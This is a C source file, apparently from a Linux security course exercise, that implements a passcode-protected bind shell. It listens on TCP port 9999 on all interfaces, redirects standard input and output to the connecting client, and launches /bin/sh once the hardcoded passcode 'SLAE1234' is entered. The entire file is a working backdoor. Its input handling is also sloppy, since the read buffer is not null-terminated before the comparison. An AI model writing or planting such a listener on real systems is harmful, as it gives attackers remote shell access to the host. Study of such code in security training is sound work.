#include <stdio.h> 
#include <sys/types.h>  
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <string.h>

int server_sockfd;    // file descriptor for the server
int client_sockfd;  // file descriptor for the client

struct sockaddr_in serveraddr;  // create a new server listen address 'serveraddr' of the structure 'sockaddr_in'

int main() 
{ 
    // Create a new TCP socket 
    server_sockfd = socket(PF_INET, SOCK_STREAM, 0); 

    // Initialize sockaddr struct to bind socket using it 
    serveraddr.sin_family = AF_INET;                  // server socket type address family = internet protocol address
    serveraddr.sin_port = htons(9999);                // server port, converted to network byte order
    serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);   // listen to any address, converted to network byte order
    
    // Bind socket to IP/Port in sockaddr struct 
    bind(server_sockfd, (struct sockaddr*) &serveraddr, sizeof(serveraddr)); 
    
    // Listen for incoming connections 
    listen(server_sockfd, 2); 
    
    // Accept incoming connections
    client_sockfd = accept(server_sockfd, NULL, NULL); 
    
    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    dup2(client_sockfd, 0); 
    dup2(client_sockfd, 1); 
    dup2(client_sockfd, 2); 
    
    // Check for a passcode
    char passcode[] = "SLAE1234";
    char password_buffer[16];
    write(client_sockfd, "Please enter the passcode:\n", 27);
    read(client_sockfd, password_buffer, 16);

    password_buffer[strcspn(password_buffer, "\n")] = '\0';

    if (strcmp(password_buffer, passcode) == 0)
    {
        write(client_sockfd, "Access Granted!\n", 16);
        execve("/bin/sh", NULL, NULL);
        close(server_sockfd); 
    
    }
    
    return 0;
}
